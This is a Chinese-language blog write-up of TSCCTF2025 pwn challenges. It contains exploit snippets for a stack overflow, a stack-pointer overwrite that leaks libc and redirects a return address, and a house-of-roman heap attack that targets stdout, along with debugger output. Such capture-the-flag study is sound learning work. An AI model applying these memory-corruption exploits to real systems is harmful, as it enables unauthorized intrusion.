# Tscctf2025


# TSCCTF2025

## gamble_bad_bad

```python
rv = b&#39;\xa1\x8d\xef\xbc\x9a&#39;

payload = b&#39;a&#39; * 0x14 &#43; b&#39;\x37\x37\x37\x00&#39;
pause()
sla(rv, payload)
```

## Localstack

```python
menu = b&#39;&gt;&gt; &#39;

def push(value):
    sla(menu, f&#39;push {str(value)}&#39;.encode())
    print(f&#39;push {(str(value))}&#39;)


def pop():
    sla(menu, b&#39;pop&#39;)


def show():
    sla(menu, b&#39;show&#39;)


def ex1t():
    sla(menu, b&#39;exit&#39;)


rv_list = []
rv = 0

for i in range(9):
    pop()
    ru(b&#39;Popped &#39;)
    rv = int(ru(b&#39; &#39;)[:-1])
    print(hex(rv))
    if rv &gt;= 0:
        rv_list.append(rv)
    else:
        rv_list.append((rv &#43; 0xffffffffffffffff &#43; 1) &amp; 0xffffffffffffffff)

show()
libc_base = rv - 0x7f410
lg(&#34;libc_base&#34;)
for i in range(1, len(rv_list))[::-1]:
    print(i)
    # print(hex(rv_list[i]))
    push(rv_list[i])

push(29)
push(30)

push(libc_base)

ia()
```

pop泄露地址，push写地址，国外比赛是不是都喜欢出覆盖计数指针的题，上次才见过一个只能一个字节一个字节写的题也是打计数指针，算一下rsp到rbp的偏移就行

这样可以写返回地址了，然后看了眼有后门函数，那就不用泄露libc了，泄露出pie_base然后写print_flag&#43;pie_base即可

















## noview

有uaf，没有show函数，肯定是打roman，为了方便，我patch了2.23的，复习一下

house of roman的关键还是在于这个既在fastbin里，又在unsortedbin里的bin

在有uaf或者off by one的情况下都可以使用下面这种方法：

```python
add(0, 0x60, )  # 000
edit(0, p64(0) &#43; p64(0x71))
add(1, 0x60)        # 070
edit(1, b&#39;ffff&#39;)
add(2, 0x60)  # 0f0
edit(2, p64(0) * 3 &#43; p64(0x51))
delete(0)
delete(1)  # delete 070
edit(1, p8(0x10))
add(3, 0x60)  # add 070
edit(3, b&#39;gggg&#39;)
add(4, 0x60)  # add 010
edit(4, p64(0) * 0xb &#43; p64(0x71))
delete(3)
edit(4, p64(0) * 0xb &#43; p64(0x91))
delete(3)
```

关键就在于使用off-by-one或者uaf，将fastbin的大小换成unsortedbin的，然后重新free一次

![image-20250125184607790](.\images\image-20250125184607790.png)

找到可以作为size的地址`0x7efd01c1b73d`，然后将其低两位写入一个unsortedbin中的main_arena&#43;96指针中

```gdb
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x56206343b2b0
Size: 0x810 (with flag bits: 0x811)
fd: 0x7f910fe1b73d
bk: 0x7f910fe1ace0

Allocated chunk
Addr: 0x56206343bac0
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x56206343bae0
Size: 0x20520 (with flag bits: 0x20521)

pwndbg&gt; tele 0x56206343b2b0
00:0000│  0x56206343b2b0 ◂— 0x0
01:0008│  0x56206343b2b8 ◂— 0x811
02:0010│  0x56206343b2c0 —▸ 0x7f910fe1b73d (_IO_2_1_stderr_&#43;157) ◂— 0x910fe1a8a0000000
03:0018│  0x56206343b2c8 —▸ 0x7f910fe1ace0 (main_arena&#43;96) —▸ 0x56206343bae0 ◂— 0x0
04:0020│  0x56206343b2d0 ◂— 0x0
... ↓     3 skipped
```

分配两次，第二次分配就可以覆盖`_IO_2_1_stdout_`的`_IO_write_base`低位为`\x00`


---

> 作者:   
> URL: https://yukon163.github.io/posts/814a8c6/  

